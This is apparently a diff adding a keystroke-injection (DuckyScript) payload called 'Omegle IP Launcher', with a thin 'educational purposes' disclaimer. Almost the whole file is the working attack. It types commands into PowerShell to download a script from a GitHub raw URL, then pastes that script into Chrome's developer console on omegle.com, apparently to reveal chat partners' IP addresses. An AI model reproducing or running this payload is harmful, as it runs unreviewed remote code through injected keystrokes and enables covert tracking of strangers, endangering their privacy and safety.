@@ -1,0 +1,43 @@
+REM Omegle IP Launcher V1
+REM Runs on chrome (Can be changed in Line 30)
+REM Commands at bottom
+REM WARNING: IP's are public information, however if they are misused it is illegal. I do not condone any illegal action, and this script is simply for educational purposes.
+REM You can 
+
+LED_R
+DELAY 100
+GUI r
+DELAY 500
+STRING powershell.exe
+DELAY 500
+ENTER
+DELAY 1000
+STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/lo12re/Starbucka/main/omegle.txt -OutFile .\Downloads\omegle.txt
+DELAY 200
+ENTER
+DELAY 1000
+STRING Start-Process 'C:\WINDOWS\system32\notepad.exe' '.\Downloads\omegle.txt'
+ENTER
+DELAY 1000
+CONTROL A
+DELAY 200
+CONTROL C
+DELAY 200
+CONTROL V
+DELAY 1000
+GUI r
+DELAY 500
+STRING chrome.exe omegle.com
+DELAY 200
+ENTER
+DELAY 2000
+CONTROL SHIFT I
+DELAY 500
+CONTROL V
+DELAY 200
+ENTER
+LED_G
+DELAY 1000
+
+REM Invoke-WebRequest -Uri https://raw.githubusercontent.com/lo12re/Starbucka/main/omegle.txt -OutFile .\Downloads\omegle.txt
+REM Start-Process 'C:\WINDOWS\system32\notepad.exe' '.\Downloads\omegle.txt'
